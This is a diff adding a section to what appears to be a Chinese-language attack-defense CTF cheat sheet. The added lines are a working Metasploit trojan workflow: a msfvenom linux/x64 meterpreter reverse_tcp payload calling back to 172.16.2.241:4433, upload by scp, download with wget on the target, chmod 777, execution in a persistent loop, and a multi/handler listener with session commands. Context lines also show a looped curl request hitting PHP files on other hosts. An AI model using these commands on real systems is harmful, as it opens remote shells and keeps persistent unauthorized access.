@@ -160,5 +160,30 @@ grep php -lr|grep vulnerabilities > list.txt
 while true;do for u in `cat list.txt`;do curl --data "kdjwekk=dwddw" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0" http://172.16.2.234:8021/$u;curl --data "jkd=wfdwef" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0" http://172.16.2.234:8011/$u;echo 1;done;done
 ```
 
+### msf木马
+```
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.16.2.241 LPORT=4433 -f elf -o /tmp/3322
+scp -P 2231 /tmp/3322 hack@172.16.2.234:/var/www/html/3322
+
+wget 172.16.2.234:8031/3322 -O /tmp/3322
+chmod 777 /tmp/3322
+while true;do /tmp/3322;done &
+
+
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+show options
+set LPORT 4433
+set LHOST 172.16.2.241
+
+exploit -j
+
+background
+
+sessions -l
+sessions -i 1
+```
+
+
 
 
